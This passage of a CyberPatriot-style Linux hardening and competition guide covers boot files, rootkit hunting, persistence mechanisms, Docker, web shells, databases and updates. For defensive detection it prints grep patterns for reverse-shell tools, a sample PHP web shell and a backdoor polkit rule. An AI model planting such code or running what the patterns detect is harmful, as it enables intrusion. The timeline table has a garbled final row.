ff02::2 ip6-allrouters
```

If you find extra entries (like `1.2.3.4 evilcdn.example.com`), remove them.

### `/etc/host.conf`

```
order hosts,bind
nospoof on
```

### `/etc/resolv.conf`

```bash
cat /etc/resolv.conf
```

Verify nameservers are not pointing to attacker-controlled IPs. Trusted defaults: `1.1.1.1`, `8.8.8.8`, `9.9.9.9`, your local resolver.

### `/etc/hosts.allow` and `/etc/hosts.deny` (TCP wrappers)

```bash
# Default-deny:
echo "ALL: ALL" | sudo tee /etc/hosts.deny
# Allow specific services:
echo "sshd: 192.168.1.0/24" | sudo tee /etc/hosts.allow
```

### `/etc/securetty`

Lists TTYs where root may log in. Trim to a minimum (or empty if root login is locked).

### `/etc/environment`

Should look like:
```
PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
```

Anything else is suspicious. Replace with the default.

---

## 24. Boot and startup

### `/etc/rc.local`

If it exists, it should be empty except for `exit 0`. Anything else is a potential boot backdoor.

```bash
cat /etc/rc.local
```

Replace with:
```bash
sudo tee /etc/rc.local <<'EOF'
#!/bin/sh
exit 0
EOF
sudo chmod 755 /etc/rc.local
```

### Disable Ctrl-Alt-Del reboot

```bash
sudo systemctl mask ctrl-alt-del.target
sudo systemctl daemon-reload
```

### `/etc/profile.d/`

Scripts here run for every user at login. Review for backdoors.
```bash
ls -la /etc/profile.d/
```

### Systemd enabled services

```bash
systemctl list-unit-files --type=service --state=enabled
```

Disable anything not needed:
```bash
sudo systemctl disable <service>
```

---

## 25. Kernel modules / hardware

**Disable USB storage** (only on hosts where physical USB shouldn't be allowed):
```bash
echo "install usb-storage /bin/true" | sudo tee /etc/modprobe.d/disable-usb-storage.conf
```

**Disable firewire and thunderbolt:**
```bash
echo "blacklist firewire-core" | sudo tee /etc/modprobe.d/firewire.conf
echo "blacklist thunderbolt"   | sudo tee /etc/modprobe.d/thunderbolt.conf
```

**Disable rare/unused protocols:**
```bash
sudo tee /etc/modprobe.d/uncommon-net.conf <<'EOF'
install dccp /bin/true
install sctp /bin/true
install rds /bin/true
install tipc /bin/true
EOF
```

**Apply:**
```bash
sudo update-initramfs -u   # Debian
sudo dracut -f             # RHEL
```

**See what's loaded:**
```bash
lsmod
```

---

## 26. Backdoor and rootkit hunting

Install and run multiple scanners:

```bash
# Debian
sudo apt install -y rkhunter chkrootkit lynis clamav debsums fail2ban auditd

# RHEL
sudo dnf install -y rkhunter chkrootkit lynis clamav fail2ban audit
```

**rkhunter** — signature-based rootkit hunter:
```bash
sudo rkhunter --update
sudo rkhunter --propupd     # baseline current state
sudo rkhunter --check --rwo # report warnings only
```

**chkrootkit** — alternative rootkit scanner:
```bash
sudo chkrootkit -q
```

**Lynis** — comprehensive security audit:
```bash
sudo lynis audit system -Q
```

Reports go in `/var/log/lynis.log`. The "Hardening index" score at the end is a useful metric.

**ClamAV** — antivirus:
```bash
sudo freshclam
sudo clamscan -ri / --exclude-dir='^/sys|^/proc|^/dev'
```

**debsums** — verify Debian package file integrity:
```bash
sudo debsums -as
```

Anything reported as "FAILED" is a modified system file — investigate.

**RPM equivalent:**
```bash
sudo rpm -Va
```

**fail2ban** — ban repeated failed logins:
```bash
sudo systemctl enable --now fail2ban
sudo fail2ban-client status
sudo fail2ban-client status sshd
```

**auditd** — kernel-level audit logging:
```bash
sudo systemctl enable --now auditd
sudo auditctl -e 1
```

**Manually look for backdoors:**
```bash
# Hidden files in /tmp, /var/tmp, /dev/shm
sudo find /tmp /var/tmp /dev/shm -name '.*' 2>/dev/null

# Recently modified files
sudo find / -mtime -7 -type f 2>/dev/null | grep -v '/proc\|/sys'

# Files modified in critical dirs
sudo find /etc /usr/bin /usr/sbin /bin /sbin -mtime -30 2>/dev/null

# Reverse shells in cron
sudo grep -r 'bash -i\|nc -e\|/dev/tcp' /etc/cron* /var/spool/cron 2>/dev/null

# Strange listening ports
sudo ss -tulnp | grep LISTEN
```

---

## 27. Advanced persistence mechanisms

These are the persistence techniques that don't fit in the standard categories. Modern CyberPatriot images and CTFs use them heavily.

### Immutable bits

Already covered in section 7. If you can't edit a file as root, run `lsattr <file>` and look for `i`.

### `/etc/ld.so.preload` library injection

This file lists shared libraries loaded into every dynamically-linked process. Default content: empty or nonexistent. Any entry is a potential rootkit hook.

```bash
sudo cat /etc/ld.so.preload
```

If non-empty, identify each library, copy it for analysis, then clear the file:
```bash
sudo cp /etc/ld.so.preload /tmp/ldso.bak
sudo > /etc/ld.so.preload
```

Also check `LD_PRELOAD` environment variable:
```bash
env | grep LD_PRELOAD
sudo grep -r LD_PRELOAD /etc/environment /etc/profile /etc/bash.bashrc /home/*/.bashrc /root/.bashrc
```

Also make sure `sudo` does not preserve it:
```bash
sudo grep -RIn 'Defaults.*env_keep.*LD_PRELOAD' /etc/sudoers /etc/sudoers.d/
```

### PAM backdoors

Attackers swap `pam_deny.so` for `pam_permit.so` so any password is accepted. Check every file in `/etc/pam.d/`:

```bash
sudo grep -rn 'pam_permit' /etc/pam.d/
```

`pam_permit` is legitimate in some lines (e.g., `account required pam_permit.so` in `/etc/pam.d/common-account`), but **not** in auth contexts. Suspicious patterns:
- `auth ... pam_permit.so`
- `auth sufficient pam_permit.so`
- `pam_unix.so ... nullok` (allows empty passwords)

Restore from a known-good backup, or rewrite. Default Debian `/etc/pam.d/common-auth`:
```
auth    [success=1 default=ignore]      pam_unix.so nullok_secure
auth    requisite                       pam_deny.so
auth    required                        pam_permit.so
auth    optional                        pam_cap.so
```

Note: the `pam_permit.so` on the third line *is correct* — it only fires after auth succeeded. The middle `pam_deny.so` is the gate.

### `/etc/update-motd.d/` scripts

Scripts here run on every login (interactive and SSH). Persistence goldmine.

```bash
ls -la /etc/update-motd.d/
sudo grep -rE 'curl|wget|nc |bash -i|/dev/tcp|base64.*-d' /etc/update-motd.d/
```

Anything suspicious: delete or `chmod -x`.

### Polkit rules

`/etc/polkit-1/rules.d/` can grant arbitrary users root via specific actions. Default files: `49-polkit-pkla-compat.rules`, `50-default.rules`. Anything else is custom — review.

```bash
ls /etc/polkit-1/rules.d/
sudo grep -rn 'polkit.Result.YES' /etc/polkit-1/
```

A rule like:
```javascript
polkit.addRule(function(action, subject) {
    if (subject.user == "joe") {
        return polkit.Result.YES;
    }
});
```
gives `joe` passwordless root for any privileged action. Delete the file.

Also check the legacy `localauthority`:
```bash
ls /etc/polkit-1/localauthority/*/*.pkla 2>/dev/null
```

### `/etc/tmpfiles.d/` sticky bits

Should set `/tmp` and `/var/tmp` to mode `1777`. The leading `1` is the sticky bit — without it, any user can delete any file in `/tmp`.

```bash
grep -E '^d /tmp|^d /var/tmp' /etc/tmpfiles.d/* /usr/lib/tmpfiles.d/* 2>/dev/null
stat -c '%a %n' /tmp /var/tmp /dev/shm
```

Fix: edit the relevant file and change `0777` to `1777`. Live fix:
```bash
sudo chmod 1777 /tmp /var/tmp /dev/shm
```

### Custom systemd units

Anything in `/etc/systemd/system/` was added after install. Review each:

```bash
ls /etc/systemd/system/*.service 2>/dev/null
for f in /etc/systemd/system/*.service; do
    echo "=== $f ==="
    grep -E '^(User|ExecStart|Restart)=' "$f"
done
```

Look for:
- `User=root` on services that don't need it
- `ExecStart=` pointing to `/tmp/`, `/dev/shm/`, `/usr/local/bin/<weird-name>`, or shell one-liners
- Services with `Restart=always` and a short `RestartSec=`

Disable suspicious units:
```bash
sudo systemctl disable --now <unit>
sudo rm /etc/systemd/system/<unit>.service
sudo systemctl daemon-reload
```

Also enumerate sockets — these can run code on connection without showing up in `list-units`:
```bash
systemctl list-sockets --all
```

### `/etc/init.d/` and autostart

Older boot persistence:
```bash
ls /etc/init.d/
ls /etc/rc*.d/
```

Desktop autostart:
```bash
ls /etc/xdg/autostart/
ls /home/*/.config/autostart/ /root/.config/autostart/ 2>/dev/null
```

### pkexec (CVE-2021-4034 / pwnkit)

The `pkexec` binary is SUID root and had a critical privilege escalation in 2022. Check:

```bash
ls -la /usr/bin/pkexec
dpkg -s policykit-1 2>/dev/null | grep Version    # Debian
rpm -q polkit                                      # RHEL
```

Fix: update the package.
```bash
sudo apt update && sudo apt install --only-upgrade policykit-1
# or
sudo dnf upgrade polkit
```

### Bash history secrets and clearing

Histories can leak credentials and reveal attacker commands.

```bash
sudo cat /root/.bash_history
sudo grep -E 'Authorization: Bearer|password=|api[_-]?key|secret=|curl.*http|/dev/tcp' /root/.bash_history /home/*/.bash_history
```

To prevent root history persistence (some images score this):
```bash
sudo ln -sf /dev/null /root/.bash_history
```

### `.git` repositories on disk

Production servers shouldn't have `.git` directories. They leak secrets via commit history.

```bash
sudo find / -xdev -type d -name '.git' 2>/dev/null
```

For each:
```bash
cd /path/to/repo
sudo git log --all --full-history -- '**/secrets*' '**/.env*' '**/config*'
sudo git show <commit-hash>
```

Remove the `.git` directory if not required:
```bash
sudo rm -rf /var/www/dashboard/.git
```

---

## 28. Container security (Docker)

Only relevant if Docker is installed and the README permits it.

### `/etc/docker/daemon.json`

Look for `insecure-registries`:
```bash
sudo cat /etc/docker/daemon.json
```

Remove any non-trusted registries:
```json
{
    "live-restore": true,
    "userland-proxy": false,
    "no-new-privileges": true,
    "icc": false
}
```

### `docker-compose.yml` files

Find them all:
```bash
sudo find / -xdev -name 'docker-compose*.yml' -o -name 'docker-compose*.yaml' 2>/dev/null
```

Dangerous flags to remove:

| Flag | Why |
|---|---|
| `privileged: true` | Container has ~all host capabilities; trivial host root |
| `/var/run/docker.sock` mounted | Container can spawn other containers as root |
| `pid: "host"` | Container sees and can signal host processes |
| `network_mode: "host"` | Container shares host's network stack |
| `cap_add: SYS_ADMIN` | Mount/unmount, bypass isolation |
| `cap_add: SYS_PTRACE` | Trace host processes |
| `volumes: /:/host` | Host filesystem mounted |
| `userns_mode: "host"` | Container uses host's user namespace |

Set instead:
```yaml
privileged: false
read_only: true
security_opt:
  - no-new-privileges:true
cap_drop:
  - ALL
```

### Docker group membership

Anyone in the `docker` group is effectively root:
```bash
getent group docker
```

Remove unauthorized members:
```bash
sudo gpasswd -d <user> docker
```

### User Docker credentials

```bash
sudo cat /root/.docker/config.json /home/*/.docker/config.json 2>/dev/null
```

The `auths` block contains base64-encoded registry credentials. After an incident, treat them as compromised — delete the `auths` block and have admins re-authenticate.

### Running containers

```bash
sudo docker ps -a
sudo docker images
sudo docker network ls
```

Suspicious image sources (untrusted registries, `latest` tags, names containing the attacker's handle) should be stopped and removed:
```bash
sudo docker stop <container>
sudo docker rm <container>
sudo docker rmi <image>
```

---

## 29. Web persistence and database users

### Webroot inspection

Common webroot paths:
- `/var/www/html`, `/var/www/<site>`
- `/srv/www`, `/srv/http`, `/srv/files`
- `/usr/share/nginx/html`

For each, look for:

```bash
# Hidden files (often config or backdoor)
sudo find /var/www -name '.*' -type f

# Backup files (leak source code and credentials)
sudo find /var/www -type f \( -name '*.bak' -o -name '*.old' -o -name '*~' -o -name '*.orig' \)

# .env files (always contain secrets)
sudo find /var/www -name '.env*'

# .git directories (leak history)
sudo find /var/www -type d -name '.git'

# PHP web shells (look for command execution from request params)
sudo grep -rlE 'system\(|exec\(|passthru\(|shell_exec\(|eval\(.*\$_(GET|POST|REQUEST|COOKIE)' /var/www
```

A typical PHP webshell:
```php
<?php
$auth = "vex_a3f8c91b";
if(isset($_GET['c']) && $_GET['k'] === $auth) {
    system($_GET['c']);
}
?>
```

Delete the file. Also delete any `.env`, `.bak`, and `.git` from webroots:
```bash
sudo rm /var/www/dashboard/x.php
sudo mv /var/www/dashboard/.env /root/.env-backup
sudo rm -rf /var/www/dashboard/.git
sudo rm /var/www/dashboard/.nginx.conf.bak
```

### Nginx hardening

Edit `/etc/nginx/nginx.conf`:
```nginx
user www-data;                  # not root
worker_processes auto;

http {
    server_tokens off;          # hide version
    client_max_body_size 1m;
    client_body_timeout 10;
    client_header_timeout 10;

    add_header X-Frame-Options "SAMEORIGIN" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-XSS-Protection "1; mode=block" always;
    add_header Strict-Transport-Security "max-age=31536000" always;

    access_log /var/log/nginx/access.log;
    error_log /var/log/nginx/error.log;
}
```

Per-site (`/etc/nginx/sites-available/<site>`):
```nginx
server {
    listen 443 ssl;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;
    ssl_prefer_server_ciphers on;

    # Avoid alias off-by-slash
    location /static/ {
        alias /var/www/dashboard/static/;
    }

    # Block hidden files
    location ~ /\. {
        deny all;
    }
}
```

```bash
sudo nginx -t
sudo systemctl reload nginx
```

### Seafile / Seahub hardening

Common config paths:
- `/opt/seafile/conf/seahub_settings.py`
- `/opt/seafile/conf/seafile.conf`
- `/srv/seafile/conf/...`
- `/etc/seafile/...`

Check Seahub session and password settings:
```bash
sudo grep -E '^(SESSION_COOKIE_SAMESITE|CSRF_COOKIE_SAMESITE|SESSION_EXPIRE_AT_BROWSER_CLOSE|USER_PASSWORD_MIN_LENGTH|USER_PASSWORD_STRENGTH_LEVEL|USER_PASSWORD_REQUIRED_CATEGORIES)' \
  /opt/seafile/conf/seahub_settings.py /srv/seafile/conf/seahub_settings.py /etc/seafile/seahub_settings.py 2>/dev/null
```

Recommended values for scored images:
```python
SESSION_COOKIE_SAMESITE = 'Lax'
CSRF_COOKIE_SAMESITE = 'Lax'
SESSION_EXPIRE_AT_BROWSER_CLOSE = True
USER_PASSWORD_MIN_LENGTH = 10
USER_PASSWORD_STRENGTH_LEVEL = 3
USER_PASSWORD_REQUIRED_CATEGORIES = 4
```

That gives you:
- cookies only sent in a first-party context
- session cookies expire when the browser closes
- minimum length of at least 10
- extra password strength checks
- at least one number, one uppercase, one lowercase, and one other symbol

Check Seafile fileserver access logging:
```bash
sudo grep -i 'access_log' /opt/seafile/conf/seafile.conf /srv/seafile/conf/seafile.conf /etc/seafile/seafile.conf 2>/dev/null
```

Enable it if it is missing, using the syntax your Seafile version expects. The key point is that fileserver requests must be logged.

Also verify Seafile init scripts are not world writable:
```bash
ls -l /etc/init.d/*seafile* /etc/init.d/*seahub* 2>/dev/null
```

### MySQL / MariaDB users

```bash
sudo mysql -e 'SELECT User, Host, plugin FROM mysql.user;'
```

Drop unauthorized users:
```sql
DROP USER 'name'@'localhost';
DROP USER 'name'@'%';
FLUSH PRIVILEGES;
```

Run the secure installer:
```bash
sudo mysql_secure_installation       # MySQL
sudo mariadb-secure-installation     # MariaDB
```

Answer:
- Switch to unix_socket: yes (if not needed remotely)
- Change root password: yes
- Remove anonymous users: yes
- Disallow root login remotely: yes
- Remove test database: yes
- Reload privilege tables: yes

Bind to localhost in `/etc/mysql/mariadb.conf.d/50-server.cnf` (or `/etc/mysql/my.cnf`):
```ini
[mysqld]
bind-address = 127.0.0.1
local-infile = 0
skip-show-database
```

### PostgreSQL users

```bash
sudo -u postgres psql -c '\du'
sudo -u postgres psql -c 'DROP USER name;'
```

Edit `/etc/postgresql/<version>/main/pg_hba.conf` — only allow local connections, use `scram-sha-256` not `trust`.

---

## 30. Browser hardening

See the GUI quick wins section. Browsers are scored on settings, not files. Open Firefox manually and verify:

- Privacy & Security → all "Block" / "Warn" boxes checked
- HTTPS-Only Mode: Enable in all windows
- Tracking Protection: Strict
- Cookies and Site Data → Delete cookies and site data when Firefox is closed
- Saved Logins: empty or only authorized
- Primary Password: SET
- Search Engines: only defaults
- Updates: automatic
- Default browser: SET

---

## 31. Updates

Run last. Updates are slow and can break running services.

| Family | Command |
|---|---|
| Debian | `sudo apt update && sudo apt upgrade -y && sudo apt dist-upgrade -y` |
| RHEL (dnf) | `sudo dnf upgrade -y` |
| RHEL (yum) | `sudo yum update -y` |
| SUSE | `sudo zypper --non-interactive update` |
| Arch | `sudo pacman -Syu --noconfirm` |

**Enable automatic updates:**

Debian — create `/etc/apt/apt.conf.d/99-cp-audit`:
```
APT::Periodic::Update-Package-Lists "1";
APT::Periodic::Unattended-Upgrade "1";
APT::Get::AllowUnauthenticated "false";
```

Check for malicious or unsafe APT overrides too:
```bash
sudo grep -RInE 'AllowUnauthenticated[[:space:]]+"?true|AllowInsecureRepositories[[:space:]]+"?true|trusted=yes|Verify-Peer[[:space:]]+"?false|Pre-Invoke|Post-Invoke|DPkg::Pre-Install-Pkgs' \
  /etc/apt/apt.conf /etc/apt/apt.conf.d /etc/apt/sources.list /etc/apt/sources.list.d 2>/dev/null
```

Then:
```bash
sudo apt install -y unattended-upgrades
sudo dpkg-reconfigure -plow unattended-upgrades
```

RHEL:
```bash
sudo systemctl enable --now dnf-automatic.timer
```

For per-application updates (Firefox, Thunderbird), use the GUI Software Updater.

**Reboot after kernel updates** if the round permits — some sysctl and module changes don't take effect until reboot. Save your work and re-run hardening after.

---

## 32. Final pass

```bash
sudo ./cp_audit.sh | tee audit-after.txt
diff audit-before.txt audit-after.txt | less
```

**Monitor the scoring report icon on the desktop** throughout the round. A score decrease means you broke something — check the most recent action log:

```bash
sudo cat /var/log/cp_audit/actions.log
sudo ./cp_audit.sh --rollback        # undo the last fix run
```

**Time-permitting tasks:**
- Lynis hardening index improvements (read `/var/log/lynis.log` suggestions)
- AIDE file integrity baseline (`sudo aide --init`)
- Custom auditd rules (`/etc/audit/rules.d/`)
- Apparmor / SELinux profiles
- USBGuard for USB allowlisting
- Browser per-site permissions
- Per-user `~/.bashrc` review for backdoor wrappers
- `~/.ssh/known_hosts` and `~/.ssh/authorized_keys` review

---

## 33. Penalties to avoid

| Action | Cost |
|---|---|
| Removing required software | Penalty |
| Stopping a critical service | Penalty |
| Deleting authorized users | Penalty |
| Deleting `root` or system accounts | System breakage |
| Locking your own account | Lockout |
| Forgetting your own new password | Lockout |
| Hand-editing `/etc/passwd` or `/etc/shadow` | Account corruption |
| `chmod 777` anywhere | Anti-hardening |
| Editing `/etc/sudoers` directly (not visudo) | Sudoers breakage |
| Restarting sshd without `sshd -t` | Lockout |
| `rm -rf /` or `rm -rf /*` | Total loss |
| Disabling NetworkManager | Network loss |
| Disabling dbus / systemd-* | System breakage |
| Mass `apt purge` without checking dependencies | Cascading removals |
| Changing PATH in `/etc/environment` to something missing `/usr/bin` | Broken shell |
| Setting `PermitRootLogin no` while root is your only account | Lockout |

---

## 34. Command reference

**Information:**
```bash
whoami
id <user>
getent passwd <user>
getent group <group>
cat /etc/os-release
hostname
uname -a
```

**Users:**
```bash
sudo passwd <user>
sudo passwd -l <user>
sudo passwd -e <user>
sudo chage -l <user>
sudo chage -M 90 -m 7 -W 14 <user>
sudo usermod -aG <group> <user>
sudo usermod -s /usr/sbin/nologin <user>
sudo gpasswd -d <user> <group>
sudo deluser --remove-home <user>     # Debian
sudo userdel -r <user>                # RHEL/SUSE/Arch
```

**Services:**
```bash
systemctl status <svc>
sudo systemctl start <svc>
sudo systemctl stop <svc>
sudo systemctl enable <svc>
sudo systemctl disable <svc>
sudo systemctl disable --now <svc>
sudo systemctl mask <svc>
systemctl list-units --type=service --state=active
systemctl list-unit-files --state=enabled
systemctl list-timers --all
```

**Files:**
```bash
ls -la <dir>
sudo nano <file>          # Ctrl+O save, Ctrl+X exit
sudo find / -name "<pat>" 2>/dev/null
sudo find / -mtime -7 2>/dev/null
sudo find / -perm -4000 2>/dev/null
sudo find / \( -nouser -o -nogroup \) 2>/dev/null
sudo rm -i <file>
chmod <mode> <file>
chown <user>:<group> <file>
stat <file>
```

**Network:**
```bash
sudo ss -tulnp
sudo lsof -i -P -n
ip a
ip r
sudo nft list ruleset
sudo iptables -L -n
sudo ufw status verbose
sudo firewall-cmd --list-all
```

**Processes:**
```bash
ps -ef --forest
ps aux --sort=-%cpu | head -30
top
sudo lsof -p <pid>
sudo strings /proc/<pid>/cmdline
```

**Logs:**
```bash
sudo journalctl -xe
sudo journalctl -u <service>
sudo tail -f /var/log/auth.log     # Debian
sudo tail -f /var/log/secure       # RHEL
last
lastb
sudo grep "Failed" /var/log/auth.log
```

**Audit script:**
```bash
sudo ./cp_audit.sh                # audit only
sudo ./cp_audit.sh --fix          # interactive fix mode
sudo ./cp_audit.sh --rollback     # undo last fix run
sudo ./cp_audit.sh --rollback-all # undo every recorded fix
sudo ./cp_audit.sh --suggest      # distro-aware command list
sudo ./cp_audit.sh --list-backups # show recorded actions
sudo ./cp_audit.sh --preserve-logs # snapshot logs before changes
```

---

## 35. Suggested timeline

For a 90-minute round:

| Time | Activity |
|---|---|
| 0:00–0:05 | Read README, screenshot, identify distro |
| 0:05–0:08 | Preserve logs (`--preserve-logs`) |
| 0:08–0:12 | Check immutable bits, remove if set |
| 0:12–0:25 | Forensics Questions |
| 0:25–0:30 | Baseline audit (`audit-before.txt`) |
| 0:30–0:40 | Users, sudoers, passwords, docker group |
| 0:40–0:45 | GUI quick wins (Software & Updates, Firefox, Settings) |
| 0:45–0:55 | Prohibited software and files |
| 0:55–1:05 | Firewall, services, SSH |
| 1:05–1:15 | Critical service hardening (Apache/nginx/MySQL/PHP/Samba) |
| 1:15–1:20 | Web persistence (.env, .git, .bak, web shells) |
| 1:20–1:25 | Advanced persistence (PAM, ld.so.preload, MOTD, polkit, tmpfiles, systemd) |
| 1:25–1:30 | login.defs, PAM, sysctl, file perms |
| 1:30–1:35 | Cron / boot / network files / kernel modules / Docker |
| 1:35–1:40 | rkhunter / chkrootkit / lynis (background) |
| 1:40–1:45 | Updates |
| 1:45–1:30 | Final audit, compare, fix regressions, monitor scoring report |

Procedure order is fixed; durations scale to round length.

---

## Operating principles

- README is authoritative.
- Make one change at a time when uncertain.
- Check the scoring report after every category.
- Failed scoring on a fix may be a wording mismatch — move on, return later.
- `cp_audit.sh --rollback` only undoes script-made changes. Manual changes are not tracked.
- Test every script and command on practice images before competition.
- Research one new service per week between rounds.
- Build a personal cheat sheet of vulnerabilities you've seen.

---

## Further reading and practice images

- **Bloons TD 6 server** (Debian 10) — easy starter
- **Mr. Robot** (Fedora) — service hardening
- **Money Heist** (Ubuntu) — medium difficulty
- **Space Force** (Debian 8) — older but classic
- **Mushroom Kingdom** (Windows Server 2019)
- **King Arthur's Castle** (Windows Server 2019)
- STIG benchmarks: <https://www.stigviewer.com/stigs>
- CIS benchmarks: <https://www.cisecurity.org/cis-benchmarks>
- Linux, Visually (YouTube series)
- CyberPatriot Discord: <https://discord.gg/cyberpatriot>
